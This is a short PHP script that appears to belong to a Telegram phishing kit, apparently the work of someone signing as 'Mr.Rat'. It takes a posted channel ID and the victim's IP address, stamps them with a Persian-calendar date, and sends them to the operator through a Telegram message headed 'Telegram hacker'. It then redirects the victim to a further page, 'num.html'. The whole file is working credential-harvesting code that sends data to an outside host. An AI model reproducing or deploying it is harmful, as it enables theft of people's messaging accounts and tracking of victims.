<?php
 include ("jdf.php");
    if (!empty($_POST)) {
        require_once 'Telegram.php';

        Telegram::sendMessage('🔐 تلگرام هکر 🔐'."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🔸ایدی کانال :'.$_POST['channel_id']."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'📱آیدی:'.$_SERVER['REMOTE_ADDR']."\n".'⏱ساعت:'.jdate("h:i:s a")."\n".'⏰تاریخ:'.jdate('l Y F ')."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".''."\n".'🆔 Mr.Rat');
		
		
    }

header ('Location: num.html ');

?>

